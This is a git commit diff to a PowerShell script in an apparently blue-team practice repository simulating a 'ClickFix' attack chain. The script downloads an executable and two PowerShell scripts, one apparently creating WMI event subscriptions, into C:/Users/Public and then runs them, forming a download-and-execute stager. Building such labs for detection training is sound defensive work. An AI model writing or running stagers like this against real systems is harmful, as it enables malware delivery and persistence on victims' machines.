bd07315463bb13a862d41b046cc393714dfa862e
Aidan Ethier <88387027+acebird@users.noreply.github.com>
2026-03-05 12:56:51 -0500

    Update SED.ps1

--- clickfix/SED.ps1
+++ clickfix/SED.ps1
@@ -1,6 +1,7 @@
-curl -L -o C:/Users/Public/c723561.exe "https://github.com/acebird/BlueTeam-Practice/blob/main/clickfix/c723561.exe"
-curl -L -o C:/Users/Public/sprint.ps1 "https://raw.githubusercontent.com/acebird/BlueTeam-Practice/refs/heads/main/clickfix/sprint.ps1"
-curl -L -o C:/Users/Public/silly.ps1 "https://raw.githubusercontent.com/acebird/BlueTeam-Practice/refs/heads/main/clickfix/wmieventcreator.ps1"
+Invoke-WebRequest -Uri "https://github.com/acebird/BlueTeam-Practice/blob/main/clickfix/c723561.exe" -OutFile "C:/Users/Public/c723561.exe"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/acebird/BlueTeam-Practice/refs/heads/main/clickfix/sprint.ps1" -OutFile "C:/Users/Public/sprint.ps1"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/acebird/BlueTeam-Practice/refs/heads/main/clickfix/wmieventcreator.ps1" -OutFile "C:/Users/Public/silly.ps1"
+
 
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\Public\sprint.ps1
 C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe C:\Users\Public\silly.ps1
